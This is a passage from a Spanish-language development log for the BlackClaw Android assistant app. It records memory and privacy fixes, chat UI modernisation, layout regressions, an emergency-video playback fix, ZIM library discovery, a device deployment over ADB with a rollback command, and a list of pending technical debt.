que la posición es "primera vez que se vio", no "última vez que se tocó" — cortar por
posición estaba desalojando justo los hechos que el usuario mantiene al día. `capByRecency`
preserva el orden de inserción entre supervivientes para que el archivo no se reordene en
cada escritura.

**#6 — NPE latente que borraba registros.** `memory/ConversationMemory.kt`: `Entry.fromJson`
usa un `readTopics(o)` privado que devuelve `emptyList` si falta la clave. Antes
`optJSONArray("topics")?.length()!!` lanzaba, el `runCatching` externo de `all()` se lo
comía y **la entrada desaparecía para siempre**. También llamaba a `optJSONArray` dos veces.

**#4 — Hora de dormir mal inferida.** Nuevos `detectWakeHour` (la hora **más temprana** de
la mañana con ≥ `MIN_SAMPLES_PER_HOUR = 3`, no la moda: el pico de uso llega bastante
después de despertar) y `detectSleepHour` (proyecta las horas 0..3 a 24..27 para que la
noche sea monótona, toma la **última** y vuelve a mapear).
*Por qué*: el código viejo tomaba la moda de un conjunto que cruza medianoche, lo que
contestaba la pregunta equivocada (actividad a las 22:00 significa **despierto**) y además
ordenaba 01:00 por debajo de 21:00.

**#2 — Ramas muertas de aprendizaje.** Nuevos `interactionForTool(toolName, params)` (puro)
y `recordToolUse()`, mapeando `open_app`→`app_opened` y
`send_message`/`send_sms`/`make_call`→`message_sent`, con nombres alternativos de parámetro.
Enganchado en `tool/ToolRegistry.kt` con
`runCatching { UserProfile.recordToolUse(name, params) }` justo antes del bloque de auditoría.
*Por qué ahí*: `executeTool` es el embudo por el que pasan **todas** las rutas (bucle del
agente, skills, planes, Tier-1, debug). Editar `OpenAppTool`/`SendMessageTool` uno por uno
habría dejado agujeros. `topApps`/`topContacts` estaban permanentemente vacíos porque el
único caller pasaba `"chat"`.

**#9 — Cinco stores JSON a mano.** Nuevo `memory/JsonListStore.kt`: base abstracta con
`all/append/upsert/removeAll/clear/replaceAll`, `cap()` interno consciente de timestamps,
sin fsync, y log de los registros ilegibles en vez de descartarlos calladamente.
`ConversationMemory` (más `forgetAll()`) y `UserMemoryStore` migrados.
*Por qué*: las cinco copias divergentes del capping son la **causa** de que #3, #5 y #6
existieran por separado. `cap` cae a `takeLast` cuando no hay timestamps, para garantizar
que la base nunca es peor que el código que sustituye.

**#8 — `extractSummary` no resumía.** Reescrito: conserva **varias** peticiones distintas vía
`dedupeRequests()` (puro; huella = prefijo alfanumérico en minúsculas de 40 chars, porque las
sesiones de voz repiten sin parar), presupuesta con `PER_REQUEST_CHARS = 70` /
`LAST_REPLY_CHARS = 90` / `SEPARATOR = " · "`, informa `(+N más)` en vez de descartar en
silencio, normaliza espacios y garantiza que sobreviva ≥ 1 petición.

**#7 — Sin superficie de privacidad.** Tres piezas nuevas:
- `memory/MemoryInventory.kt` — arma conteos, explicaciones y vistas previas de las 4
  categorías (perfil aprendido, hechos, resúmenes, tareas), más `forget(id)`,
  `forgetEverything()`, `totalCount()` (barato, para la fila de ajustes) y
  `approxTokens()`. Cada lectura va con su propio `runCatching`.
  *Por qué la lógica va aquí y no en el Composable*: la pantalla no puede contradecir a lo
  que hay guardado, y el coste en prompt se vuelve testeable. Además una pantalla de
  privacidad que no carga es una pantalla que no puede borrar nada.
- `UserProfile.forgetEverything()` — limpia `KEY_PROFILE`, `KEY_PATTERNS`,
  `KEY_INTERACTIONS` y el buffer `pending`. *Por qué también el registro de interacciones*:
  el perfil es dato **derivado**; borrar solo el perfil dejaba que el siguiente
  `learnFromInteractions()` resucitara nombre, ciudad, horarios y contactos — un botón de
  borrar que miente.
- `ui/settings/MemoryPrivacyActivity.kt` — pantalla Compose sobre `ui/design/`. Encabeza con
  "esto sale del teléfono" y el coste aproximado en tokens por mensaje, luego una tarjeta por
  categoría (conteo, explicación en lenguaje llano, muestra, "Olvidar esto") y un borrado
  total con confirmación. Registrada en `AndroidManifest.xml`
  (`exported="false"`, `portrait`) y alcanzable desde una sección **Privacidad** nueva en
  `SettingsActivity`, colocada junto a los ajustes del modelo — no bajo "Avanzado" — porque
  esto se envía con cada prompt y un control que no se encuentra no es un control.

Tests nuevos: `test/memory/UserProfileLogicTest.kt` (20), `MemoryStoreLogicTest.kt` (18),
`JsonListStoreTest.kt` (11), `MemoryInventoryTest.kt` (13).

#### Despliegue en dispositivo — 2026-07-27 22:53

Primera instalación real de esta sesión. Dispositivo: **HONOR PTP-N49**, Android 16
(API 36), arm64-v8a, por ADB inalámbrico en `192.168.100.18:38469`.

**Descubrimiento del dispositivo**: el `adb` de este sistema (1.0.41 / 35.0.2-android-tools)
está compilado **sin mDNS** — `adb mdns check` responde `unknown host service`. Por eso
`adb connect` a ciegas no sirve: el puerto de depuración inalámbrica es aleatorio. La ruta que
funciona es `avahi-browse -rtp _adb-tls-connect._tcp`, que devuelve IP y puerto directamente.
No hizo falta emparejar (`_adb-tls-pairing._tcp` vacío = ya vinculado de antes).

**Respaldo del APK instalado** (antes de tocar nada):
`/home/angel/Descargas/blackclaw/apk-backups/BlackClaw_INSTALLED_v1.1.3_vc113_20260727.apk`
— 151.284.197 bytes, sha256 `05f4ba3d…4b01`, zip verificado con `unzip -t`.
Era v1.1.3 / versionCode 113, instalada el 30/06, actualizada el 22/07. Sin splits.

**Claves de firma**: el zip `~/Descargas/blackclaw-keys-main.zip` resultó **byte por byte
idéntico** a lo que ya había en `signing/` (mismos sha256 en `.jks` y `.properties`), así que
no se copió nada. La huella de la clave coincide con la del APK instalado:
`D4:C6:61:3C:…:04:6F`. Es decir, la actualización es en sitio y **no** pierde datos.

**Build**: `BLACKCLAW_VERSION_NAME=1.1.4 ./gradlew assembleRelease` (release = minify +
shrink, o sea la primera vez que se ejercita el `proguard-rules.pro` recortado).
Salida en `app/build/outputs/apk/release/`: arm64-v8a 131 MB, x86_64 136 MB, universal 221 MB.
Instalado el arm64-v8a con `adb install -r`.

**Decisión: `versionCode` se dejó en 113, solo subió `versionName` a 1.1.4.**
El recorte de ProGuard nunca se había ejecutado en runtime, así que hacía falta una vuelta
atrás garantizada. Con el mismo versionCode, reinstalar el APK de respaldo encima está
siempre permitido y conserva los datos. Si se hubiera subido a 114, volver atrás exigiría
`adb install -d` (degradar), que en una app no depurable el dispositivo puede rechazar, y
entonces el único camino sería desinstalar = perder API keys, tokens de Telegram, passwords
SSH y toda la memoria. El nombre sí subió porque `SettingsActivity` muestra
`v${BuildConfig.VERSION_NAME}` y sin eso no habría forma de confirmar desde la app que la
instalación funcionó (nada en el código lee `BUILD_FINGERPRINT`).
Al hacer un release de verdad hay que subir **ambos**.

**Verificado en el dispositivo**: `versionName=1.1.4`, `versionCode=113`; `firstInstallTime`
sigue en 2026-06-30 y solo cambió `lastUpdateTime` → fue actualización en sitio, no
instalación limpia; 33 permisos siguen concedidos; la app arranca
(`ui.splash.SplashActivity` → `ui.chat.ComposeChatActivity`), proceso vivo, y **cero**
`FATAL`/`ClassNotFound`/`NoSuchMethod`/`NoClassDefFound` — que era el modo de fallo concreto
que podía provocar el recorte de ProGuard. Buffer `crash` vacío.
Con esto el riesgo "cambio de ProGuard sin verificar en dispositivo" queda **cerrado para el
arranque y el chat**; las rutas que usan reflexión de Gson y no se tocaron al arrancar siguen
sin ejercitar.

**NO verificado**: `MemoryPrivacyActivity` no se pudo abrir. Es `exported="false"` (correcto),
así que `am start` desde adb la rechaza con `SecurityException` — lo cual, de paso, prueba que
el sistema **sí resolvió** el componente en la app instalada, o el error habría sido "Activity
class does not exist". Navegar por la UI habría requerido el teléfono desbloqueado
(`mDreamingLockscreen=true`, `mInputRestricted=true`) y no tengo el PIN. Sus lecturas de MMKV
y el borrado real siguen sin ejercitar.

**Vuelta atrás** si algo sale mal:
```bash
adb connect 192.168.100.18:38469
adb install -r /home/angel/Descargas/blackclaw/apk-backups/BlackClaw_INSTALLED_v1.1.3_vc113_20260727.apk
```

#### Pantalla de chat — modernización visual (v1.1.5)

La pantalla donde el usuario vive y la única grande que seguía sin tocar. Restricción que
manda sobre todo lo demás: el chat honra **10 temas** vía `ThemeManager`, así que ningún
color se elige a mano — o es un slot de `BlackClawColors` o es una mezcla derivada de uno.
De `ui/design/` se reusa **movimiento**, no colores.

**Markdown, que no existía.** `AssistantBubble` pintaba `Text(text)` crudo, así que cada
`**negrita**`, título, lista y bloque de código llegaba al usuario como puntuación
literal. El modelo llevaba todo el tiempo formateando sus respuestas; la UI mostraba el
código fuente. Dos archivos nuevos:

- `ui/chat/ChatMarkdown.kt` — parser **puro** (sin Android ni Compose): `parse(raw)` →
  `Paragraph`/`Heading`/`Bullet`/`Numbered`/`Quote`/`Code`/`Rule`, más
  `inlineSpans()` para negrita, cursiva, tachado y código en línea.
  *El streaming es la restricción dura*: `parse()` corre otra vez en cada token, así que
  un fence sin cerrar produce igualmente un `Code(closed=false)` — tratarlo como párrafo
  hasta que llegue el cierre re-maquetaría el texto de golpe, y eso se lee como un fallo.
  Por lo mismo un `**` sin cerrar abre negrita ya, para que no parpadee.
  Reglas de flanqueo e intrapalabra para que `2 * 3` y `snake_case` **no** se conviertan
  en cursiva; un backtick suelto queda literal en vez de tragarse el resto del mensaje.
  Escapes con backslash **no** soportados a propósito: a medias son peores que ninguno.
  **43 tests**, incluido uno que parsea todos los prefijos de una respuesta para simular
  el streaming completo.
- `ui/chat/ChatMarkdownText.kt` — el renderizador. `codeSurface()` **deriva** el fondo de
  los bloques de código (`luminance()` del fondo decide, luego mezcla hacia negro), así
  un tema nuevo obtiene una superficie coherente gratis. El botón de copiar de un bloque
  solo aparece si el fence está cerrado: ofrecer "copiar" sobre media orden de shell es
  peor que no ofrecer nada. Los bloques hacen scroll horizontal en vez de envolver,
  porque envolver destruye la indentación y convierte una línea lógica en varias
  aparentes.

**Copiar y seleccionar, que tampoco existía.** No había forma de sacar una respuesta de
la app. Ahora el cuerpo va en `SelectionContainer` (se puede tomar un trozo) y el pie
tiene un botón visible `Copiar`. Se eligió afordancia visible sobre gesto oculto, y
`SelectionContainer` sobre long-press porque la lista ya usa tap-para-cerrar-teclado y un
long-press por burbuja competiría con él.

**Autoscroll: eran dos bugs, no uno.** El efecto miraba solo `messages.size`, así que no
seguía una respuesta que crecía token a token. Ahora hay un ancla de 1 dp al final de la
lista (scrollear al índice de un mensaje muestra su *primera* línea, que en streaming es
justo lo que no interesa) y dos efectos: uno que siempre salta al llegar un mensaje
nuevo, y otro que sigue el crecimiento **solo si la cola ya está a la vista**, para no
deshacerle la lectura a quien subió a releer. El de crecimiento es instantáneo: una
animación por token se encola y tartamudea.

**Barra de entrada.** Los FAB de micro y enviar eran de `34.dp`, muy por debajo del
mínimo de 48 dp y difíciles de acertar con una mano: ahora el área táctil es de 48 dp y
el círculo pintado sigue pequeño. **Se añadió el botón de adjuntar**: `onAttach` se
recibía como parámetro y no se usaba, así que el selector de imágenes con OCR que
`ComposeChatActivity` ya tenía completo era inalcanzable. El fondo del modo Tarea usaba
un marrón fijo (`0xFF1A1410`) que solo tenía sentido junto a un acento ámbar; ahora se
tiñe hacia el acento del tema y la transición está animada. El toggle dejó de ser
`"💬 Chat"` / `"🤖 Task"` (emoji dentro del string y una palabra sin traducir) y pasó a
icono + texto con relleno animado.

**Barra superior.** Local/Cloud eran dos `Surface` independientes que alternaban su
propio borde, o sea dos botones sin relación de los que uno estaba subrayado. Ahora es un
segmentado con una pastilla que **se desplaza** entre las dos mitades: ese movimiento es
lo que dice "estas son las dos opciones y estás en esta". Los cuatro colores del contador
de tokens salieron de literales sueltos a los acentos semánticos del producto.

**Estado vacío.** Halo lento detrás de la marca (la única animación puramente decorativa,
así que es la única que consulta `reduceMotion`), la IA activa como chip en vez de una
línea de texto tintado, y las sugerencias entran escalonadas. El emoji se quitó del texto
de la sugerencia porque ese string se envía **literal** al modelo; ahora el rail lateral
marca cuál es tarea.

**Otros arreglos que salieron al paso.** El sentinel `"..."` que dispara el indicador de
escritura estaba duplicado en 9 sitios sin documentar; ahora es `ChatMessage.PENDING` con
un predicado `isPending`, y queda anotado que `CloudContextHandoffFormatter` también
depende de él — si dejaran de coincidir, el placeholder se mandaría al modelo cloud como
si el asistente hubiera contestado con puntos suspensivos. `ToolGroup` pasó a contenedor
con rail: sin un borde, seis pasos de herramienta parecían seis mensajes crípticos
sueltos. `UserBubble` y `BCAvatar` dejaron de estar duplicados. La animación de entrada
usaba `16f` en **píxeles** (unos 4 dp en este teléfono, imperceptible); ahora son 16 dp
reales y respeta `reduceMotion`.

**Código muerto borrado (~530 líneas).** `PermissionBanner`, `SkillShortcutBar`,
`QuickTasksPanel`, `TaskSkillsPanel` y `SkillCard` no tenían ni una llamada. `ChatScreen.kt`
bajó de 2.747 a **2.539** líneas pese a todo lo añadido. También se limpiaron 8 imports
huérfanos y se ordenó el bloque.

Verificado: `compileDebugKotlin`, `testDebugUnitTest` (**596 tests, 0 fallos**; 553 antes,
+43 del parser), `lintDebug`, `assembleRelease`. Instalado en el HONOR PTP-N49 como
**v1.1.5** (versionCode sigue en 113): `firstInstallTime` intacto, arranca en
`ComposeChatActivity`, cero crashes y cero errores en logcat.

#### Corrección de la barra superior (v1.1.6)

**Regresión introducida en v1.1.5 y detectada por el usuario en pantalla.** Lección: que
compile, que pasen los tests y que arranque sin errores **no** dice nada sobre si el
layout cabe. Nada de lo que se ejecutó podía detectar esto.

Qué se veía: el botón del cajón dibujado encima de la etiqueta "Chats" (`☰hats`), y el
logotipo *BlackClaw* y el engranaje de **Ajustes** empujados fuera de la pantalla — o sea
que Ajustes dejó de ser alcanzable desde el chat.

Causa: `ModelScopeSwitch` medía el espacio disponible con `BoxWithConstraints` y usaba
`maxWidth / 2`. Un `Row` dentro de las acciones de un `TopAppBar` entrega a sus hijos un
ancho prácticamente ilimitado, así que "la mitad del máximo" resolvió a un número enorme y
el control se comió la barra completa, desbordando incluso hacia la izquierda por encima
del botón del cajón.

Arreglado en tres partes:

1. `ModelScopeSwitch` declara su propio tamaño (`segment = 58.dp`, alto 30 dp) y anima la
   pastilla con `animateDpAsState`. Un control tan pequeño debe **decir** cuánto mide, no
   preguntarlo.
2. El interruptor se **movió** de la barra superior a la fila de estado del modelo. En la
   barra tenía que compartir una línea con el logotipo, el cajón, "Chats" y el engranaje,
   y en un ancho de teléfono no cabe. En la fila de abajo además queda junto a lo que
   gobierna: decide qué lista de modelos ofrece el selector de la izquierda.
3. El placeholder del composer se acortó y se fijó a una línea. Con tres botones de acción
   compartiendo la fila el campo es estrecho, y el texto largo saltaba a una segunda línea
   estirando el composer al doble de alto **estando vacío**.

De paso, el nombre del modelo ahora se trunca con elipsis antes que el coste en tokens: un
nombre cortado se recupera abriendo el selector, una factura cortada no.

**Instalado y verificado en pantalla** (HONOR PTP-N49, v1.1.6, versionCode 113). Esta vez
la comprobación se hizo mirando, no solo leyendo logs:

- `adb exec-out screencap` + inspección de la captura: la barra superior muestra menú,
  punto de acento, logotipo *BlackClaw*, "Chats" y engranaje, sin solapes.
- El interruptor Local/Cloud aparece en la fila del modelo con la pastilla sobre "Cloud".
- El composer mide una sola línea de alto con el placeholder corto.
- Tap real sobre el engranaje + `uiautomator dump`: la pantalla de Ajustes abre. Esto es lo
  que estaba roto, así que se verificó pulsándolo, no deduciéndolo.
- `adb logcat -b crash`: cero entradas.

**Nota de método**: `dumpsys activity activities | grep topResumedActivity` devolvió una
línea obsoleta que decía que seguíamos en el chat cuando Ajustes ya estaba abierto. Para
confirmar en qué pantalla estás, el volcado de `uiautomator` es fiable; ese grep no.

#### Modo emergencia — vídeo en negro al reproducir (v1.1.7)

Reportado por el usuario: "en el modo emergencia los videos no se ven, se ven en negro".

**Causa raíz, en el reproductor, no en la grabación.**
`ui/settings/EmergencyEvidencePlayerActivity.kt` llamaba a
`setBackgroundColor(Color.BLACK)` sobre el `VideoView`.

`VideoView` es un `SurfaceView`: su vídeo se compone en una capa **detrás** de la
ventana, y la vista se limita a dejar un agujero transparente para que asome. Al darle
un fondo opaco, la vista empieza a pintar ese negro en la capa de la ventana, justo
encima del agujero. El vídeo seguía decodificándose y reproduciéndose perfectamente,
solo tapado. Nada reportaba error porque nada fallaba — de ahí que el síntoma fuera
"se oye pero no se ve" sin ninguna pista en el log.

Arreglado: el `VideoView` ya no tiene fondo. El respaldo oscuro que ese color pretendía
dar lo pone ahora un `FrameLayout` contenedor, que es a quien le corresponde. La razón
queda escrita en el KDoc de la clase para que nadie vuelva a añadirlo.

**Segundo camino legítimo al negro.** La grabación produce segmentos de **audio** junto
a los de cámara (`recordAudio` está activado por defecto, y cada rotación de 30 s genera
uno), y la lista de evidencias ofrecía el mismo botón "VER" para ambos. Un `.m4a` no
tiene imagen, así que se veía exactamente igual que el defecto anterior. Ahora la
reproducción de solo-audio muestra un rótulo explícito en vez de un escenario vacío sin
explicación. El rótulo se dibuja **solo** cuando no hay imagen que tapar.

**Defecto de integridad encontrado por el camino** (no era la causa, pero produce vídeo
roto y es peor que un fallo visual). `EmergencyEvidenceVault.decryptFile` usaba
`CipherInputStream`, que **se traga** `AEADBadTagException` al cerrar y reporta un final
de flujo normal. Una evidencia truncada o alterada volvía como un archivo corto pero
"correcto", que además pasaba el `require(length > 0)` de `decryptToCache`. Eso anula
por completo la razón de sellar con un cifrador autenticado. Ahora el cifrador se
maneja directamente con `update`/`doFinal` (en streaming, no cargando el segmento en
memoria) para que el fallo de tag se propague y el llamante borre la salida parcial.
+2 tests: evidencia con un byte alterado y evidencia sin su tag final, ambas deben
**rechazarse**.

También: el toast de error del reproductor ahora incluye los códigos `what/extra` de
`MediaPlayer`, porque un segmento truncado y uno ilegible fallan de forma distinta y sin
los códigos el mensaje no dice nada aprovechable.

**Nota de verificación**: esta pantalla usa `FLAG_SECURE` a propósito, para que la
evidencia no salga en capturas, grabaciones de pantalla ni pantallas espejadas. La
consecuencia es que **una captura de esta pantalla siempre muestra el vídeo en negro**,
funcione o no. No se puede verificar con `adb exec-out screencap`: hay que mirar el
teléfono.

Verificado: `compileDebugKotlin`, `testDebugUnitTest` (**598 tests, 0 fallos**),
`assembleRelease` firmado con la clave de siempre. **NO instalado todavía**: el teléfono
rechazaba la conexión de depuración inalámbrica.

#### Biblioteca offline (ZIM) — no detectaba el archivo descargado (v1.1.8)

Reportado por el usuario: la biblioteca offline no encuentra el `.zim` aunque Kiwix lo
tiene en `/storage/emulated/0/Android/media/org.kiwix.kiwixmobile/kiwix/`.

**Causa raíz: un error de profundidad de exactamente un nivel.**
`DirectZimLibrary.discover()` recorría la raíz del volumen, `Download` y `Documents`, cada
uno con `maxDepth(4)`. La ruta real de Kiwix está a **cinco** niveles de la raíz:

```
Android / media / org.kiwix.kiwixmobile / kiwix / wikipedia_es_all_maxi.zim
   1        2                3                4              5
```

Así que el recorrido entraba en la carpeta `kiwix` y se detenía sin listarla. El archivo
quedaba un nivel fuera de alcance.

**Y el mensaje mentía.** Decía "No encontré archivos .zim… colócalo en Download o
Documents", que es un diagnóstico falso: el archivo estaba exactamente donde su propio
descargador lo pone. Un diagnóstico equivocado cuesta más tiempo que no dar ninguno.

**Nuevo: `knowledge/ZimDiscovery.kt`** — objeto puro con el plan de búsqueda, para que la
aritmética de profundidad (lo que estaba mal) se pueda **probar** en vez de razonar.
Decisiones:

- **Raíces explícitas en vez de un recorrido profundo.** Subir el límite del recorrido
  general es la solución obvia y la equivocada: el almacenamiento compartido tiene
  decenas de miles de fotos y adjuntos, y un recorrido profundo sin filtrar convierte
  abrir la biblioteca en un tirón de varios segundos. Cada sitio donde realmente vive un
  archivo tiene su raíz y su profundidad: `Android/media` (4), carpetas con nombre —
  Download, Downloads, Documents, Kiwix, ZIM — (3), y la raíz del volumen (3) **podada**.
- **Poda** de `DCIM`, `Pictures`, `Movies`, `Music`, `WhatsApp`, `Telegram`, ocultas, etc.
  `Android` se poda porque `Android/media` ya es una raíz explícita, y `Android/data` es
  ilegible en Android 11+ de todas formas. La poda es lo que hace asequible buscar más
  hondo.
- **Tarjeta SD incluida.** Una Wikipedia completa son decenas de GB, así que la SD es un
  sitio perfectamente normal — y el escaneo anterior solo miraba el volumen primario.
  Los volúmenes se sacan de `/storage`, ignorando `emulated` y `self` porque son la
  indirección que vuelve al primario que ya tenemos.
- **Archivos partidos.** Kiwix divide los archivos grandes en `.zimaa`, `.zimab`… Una
  parte sola no es un ZIM legible, así que encontrar solo partes se reporta como su propia
  situación. Antes habría dicho "no encontré nada" mientras el usuario mira archivos con
  "zim" en el nombre, lo que se lee como que la app está rota.
- **Permiso distinguido de ausencia.** Un `.zim` no es imagen, vídeo ni audio, así que los
  permisos granulares de Android 13 **no** lo cubren: leerlo del `Android/media` de otra
  app exige acceso a todos los archivos y nada menos. `hasFullStorageAccess()` lo
  comprueba, y sin él un escaneo vacío no dice nada sobre lo que hay en disco. El botón
  "Conceder acceso a archivos" ya existía en la pantalla.

También: si se encuentra un `.zim` pero no se puede abrir, el mensaje ahora lo dice
("puede que la descarga esté incompleta") en vez de reportar "ninguna encontrada", que
mandaría al usuario a buscar un archivo que está ahí.

**Verificado con datos del dispositivo** (HONOR PTP-N49, no supuestos):
`ls` confirma `wikipedia_es_all_maxi_2026-05.zim`, **40.766.243.832 bytes (40,7 GB)** en
la ruta de Kiwix; `appops` confirma `MANAGE_EXTERNAL_STORAGE: allow`, o sea que el permiso
**sí** estaba concedido y la profundidad era el único fallo.
Revisado además que `DirectZimReader` aguanta 40 GB: usa `RandomAccessFile` con
`seek(Long)` y offsets de 64 bits, sin `MappedByteBuffer` (un mapeo se rompería pasados
2 GB). Los índices que sí carga en memoria están acotados (`MAX_CLUSTER_BYTES` 128 MB).

Tests: `test/knowledge/ZimDiscoveryTest.kt`, 26 tests. El primero afirma que **la ruta
real de Kiwix queda cubierta**, y otro documenta que está a 5 niveles — que es la razón
por la que un límite de 4 la perdía. Total del proyecto: **624 tests, 0 fallos**.
Instalado como v1.1.8.

**No verificado en pantalla**: no llegué a abrir la biblioteca en el teléfono para ver la
lista poblada — la depuración inalámbrica se cayó al bloquearse el dispositivo. Y sobre el
archivo de 40 GB: la búsqueda por título debería ir bien, pero construir el índice de
contenido completo sobre 40 GB es una operación de horas y no se ha medido.

#### Asistente — el hero se comía la pantalla (v1.1.9)

Reportado por el usuario: la pantalla del asistente no muestra las categorías, y al elegir
Recordatorios no aparece ningún recordatorio.

**Causa raíz en `ui/design/ClawHeroCard`, no en la pantalla del asistente.** El brillo
ambiental de la tarjeta se dimensionaba así:

```kotlin
BoxWithConstraints(...) {
    Box(Modifier.offset(...).fillMaxWidth(0.35f).height(maxHeight) ...)   // brillo
    content()
}
```

Un `Column` mide su primer hijo con **toda** la altura restante, así que ahí `maxHeight`
resuelve a la pantalla completa. El brillo pedía esa altura, un `Box` se dimensiona a su
hijo más grande, y la tarjeta hero pasaba a ocupar el viewport entero. A partir de ahí el
`Column` había consumido todo el alto, así que los hijos siguientes — las pastillas de
categoría y la `LazyColumn` de items — se medían con altura **cero** y desaparecían sin
error alguno.

Arreglado con `Modifier.matchParentSize()`, que es la primitiva hecha justo para esto:
rellena el padre **sin participar en medirlo**, así que la tarjeta la sigue dimensionando
su contenido. Se aplicó el mismo criterio a `ClawShimmer` (`fillMaxSize` en vez de
`height(maxHeight)`), que hoy funciona solo porque todos sus llamadores le pasan una
altura fija — era la misma trampa esperando.

`ClawHeroCard` solo lo usa `AssistantHero`, así que el radio de daño era exactamente la
pantalla reportada.

**Segunda regresión de layout de la misma familia en esta sesión** (la primera fue la
barra superior del chat en v1.1.5). Las dos compilaron, pasaron todos los tests, pasaron
lint y R8, arrancaron sin un solo error en logcat, y las dos las encontró el usuario
mirando la pantalla. La conclusión no es "hacer una captura", es **hacer una captura de
cada pantalla que se toca**: el arreglo del chat se verificó con una captura del chat, y
esta pantalla nunca se abrió porque el cambio que la rompió estaba en un componente
compartido, no en ella.

Verificado: `compileDebugKotlin`, `testDebugUnitTest` (**624 tests, 0 fallos**),
`assembleRelease`. **NO instalado ni visto en pantalla**: la depuración inalámbrica del
teléfono rechazaba la conexión.

---

## Pendientes

### Deuda mayor no abordada

- **i18n roto**: `values/` está en español sin `values-es/`, así que todo locale fuera de
  zh/ja recibe español. 395 `ToolResult.error(` + 207 `success(` hardcodeados;
  **1 sola** llamada a `stringResource()` en 375 archivos. 101 de 216 strings sin usar.
  **Trampa de orden**: `QuickAssistActivity.friendlyError` hace match de substrings en
  español y lo manda a TTS — convertirlo a códigos tipados **antes** de extraer strings,
  o se rompe el manejo de errores por voz sin que nada falle visiblemente.
- `ui/chat/ChatScreen.kt` — 2.539 líneas. Ya modernizada visualmente y limpia de código
  muerto, pero sigue siendo **un solo archivo con todo** y `ChatScreen()` sigue teniendo
  31 parámetros. Trocearlo en archivos por zona (barra superior, lista, composer, sidebar)
  es el siguiente paso obvio y es puramente mecánico.
- **Lógica de negocio dentro de la vista del chat**: `ChatTopBar.onTabChange` y el
  `DropdownMenu` de modelos leen `KVUtils`, resuelven `CloudProvider` y tocan el
  filesystem durante la composición. No se movió en el pase visual a propósito, para no
  mezclar un refactor de arquitectura con uno de estilo.
- **`MonitorDialog` y `SendMessageDialog` están implementados pero son inalcanzables**:
  `showMonitorSheet`/`showSendSheet` nunca se ponen en `true`, aunque `onStartMonitor` y
  `onSendDirectMessage` sí están conectados a funcionalidad real en la Activity. Es el
  mismo caso que `onAttach`, que ya se arregló. **No se borraron** porque son una función
  de verdad, no decoración: hay que decidir dónde va su punto de entrada (un menú junto a
  adjuntar sería lo natural). Son ~330 líneas esperando un botón.
- `ChatScreen` sigue aceptando `needsPermission` y `onFixPermissions` sin usarlos.
- `ui/settings/SettingsActivity.kt` — 907 líneas, 64 literales hardcodeados. Sin migrar.
- `agent/DefaultAgentService.runAgentLoop` — 477 líneas, sin tests.
- Cifrado en reposo de MMKV (API keys, bot tokens, **passwords SSH en claro**). Incluye la
  memoria: el defecto #7 ya tiene UI para **ver y borrar**, pero mientras está guardada
  sigue en claro. Ver y borrar era el hueco urgente (no había ninguna forma); cifrarla es
  el siguiente paso, no un sustituto.
- Los otros tres stores (`agent/TaskHistoryStore.kt`, `proactive/ProactiveMemory.kt`,
  `assistant/RoutineEngine.kt`) siguen con su JSON a mano: `JsonListStore` existe y los dos
  de `memory/` ya están migrados, pero estos tres no. Migrarlos es mecánico y sin riesgo.
- Mover `debug/DebugTaskReceiver` y `TaskTriggerReceiver` a `src/debug/`.
- `ClawAccessibilityService` sin `@Nullable`/`@NonNull` → 38 callers Kotlin sin null-safety.

### Riesgos conocidos aceptados

- `ScreenCaptureService` recicla el frame anterior; ventana estrecha en la que otro hilo
  podría estar en medio de un OCR (macro de juego solapando `game_observe`).
  `@Synchronized` la reduce, no la elimina.
- Cambio de ProGuard: el release **ya está instalado y arranca sin errores** en el HONOR
  PTP-N49 (ver despliegue 2026-07-27). Cubre arranque y chat. Las rutas que usan reflexión de
  Gson y no se recorren al arrancar siguen sin ejercitar.
- `ui/settings/MemoryPrivacyActivity.kt`: el usuario confirmó que la pantalla carga y
  funciona. El **borrado real** sigue sin ejercitarse (nadie ha pulsado "Olvidar").
- **Ningún check automático de este proyecto detecta un layout que no cabe.** Ha pasado
  **dos veces**: la barra superior del chat (v1.1.5) y el hero del asistente comiéndose la
  pantalla (v1.1.9). Las dos compilaron, pasaron todos los tests, lint, R8 y un arranque
  limpio sin errores en logcat; las dos las encontró el usuario mirando el teléfono.
  Regla que se saca de ahí: tras un cambio visual hay que capturar **cada pantalla
  afectada**, y si el cambio está en `ui/design/` eso significa cada pantalla que use el
  componente — no solo la que se tenía en mente. Sigue siendo manual: no hay tests de
  captura ni de layout en el proyecto, y eso es la deuda real.
- **Trampa de layout a vigilar**: `height(maxHeight)` dentro de un `BoxWithConstraints`
  que vive en un `Column`. `maxHeight` es la altura restante del Column, no la del
  contenido, así que el hijo se traga el viewport y deja a sus hermanos en cero. Para
  rellenar un padre sin medirlo se usa `Modifier.matchParentSize()`.
- Confirmado en pantalla (v1.1.6): markdown con negrita, botón `Copiar` en cada respuesta,
  barra superior completa, interruptor Local/Cloud, composer de una línea, Ajustes abre.
- **Sin ejercitar todavía**: bloques de código con lenguaje y su botón de copiar (hace falta
  pedirle código al modelo), adjuntar imagen con OCR, y el autoscroll durante streaming. El
  parser tiene 43 tests; el Composable que lo dibuja no tiene ninguno.
- Detalle estético abierto: el interruptor Local/Cloud pesa visualmente más que el nombre
  del modelo de 11 sp que tiene al lado. Funciona, pero el equilibrio de esa fila se puede
  mejorar.
- El APK instalado y el de respaldo comparten `versionCode` 113 a propósito (rollback
  garantizado). Al publicar un release de verdad hay que subir versionCode **y** versionName.
- **Regresión deliberada**: `http://192.168.x.x:11434` (ollama en LAN) ya no es
  configurable, para que la capa de app coincida con la plataforma. Inferencia on-device
  no afectada. Workaround: TLS o túnel a loopback.
- **Regresión deliberada**: `add_smart_device` rechaza http y direcciones privadas;
  dispositivos ya guardados que apunten ahí dejan de disparar.

---

## Anexo A — Estructura de directorios

```
BlackClaw/
├── PROYECTO.md                     ← este archivo
├── README.md
├── app/
│   ├── build.gradle.kts            SDK, signing, splits ABI, deps
│   ├── proguard-rules.pro          reglas acotadas (ver registro)
│   └── src/
│       ├── main/
│       │   ├── AndroidManifest.xml ~40 permisos, componentes exportados
│       │   ├── assets/
│       │   │   └── web/index.html   página de config LAN (+ gate de código)
│       │   ├── res/
│       │   │   ├── values/          ⚠ está en ESPAÑOL, sin values-es/
│       │   │   ├── values-zh/, values-ja/
│       │   │   └── xml/network_security_config.xml
│       │   └── java/com/blackclaw/android/
│       │       ├── ClawApplication.kt      arranque
│       │       ├── AppViewModel.kt         estado global
│       │       ├── TaskOrchestrator.kt     ciclo de vida de tareas
│       │       ├── TaskSessionStore.kt     lock de tarea única
│       │       ├── adb/                    ADB inalámbrico (pair/connect/shell)
│       │       ├── agent/                  ★ núcleo del agente
│       │       │   ├── DefaultAgentService.kt   agent loop (runAgentLoop: 477 líneas)
